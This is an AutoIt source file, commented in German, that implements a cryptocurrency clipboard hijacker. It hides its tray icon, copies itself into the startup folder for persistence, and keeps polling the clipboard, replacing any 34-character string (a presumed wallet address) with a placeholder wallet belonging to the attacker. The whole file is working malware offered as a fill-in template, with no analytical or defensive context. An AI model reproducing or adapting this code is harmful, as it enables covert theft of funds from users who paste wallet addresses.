;Autor: LH-Cybersecurity

#NoTrayIcon ;versteckt icon

Global $wielang = "34" ;länge der Adresse
Global $wallet = "DeineWalletx45323dl23l123ls1231" ;Wallet auf die die Orginal Wallet geändert werden soll

FileCopy(@ScriptFullPath,@StartupCommonDir);Kopiert Programm in Autostart

While 1
$clip=ClipGet(); Zwischenablage auslesen
ConsoleWrite($clip)

$lang=StringLen($clip); Länge der Zwischenablage auslesen
ConsoleWrite($wielang)

if $lang==$wielang then ClipPut($wallet); wenn Zwischenablage eine Adresse ist wird sie geändert.
Sleep(100);Ressoursen schonend
WEnd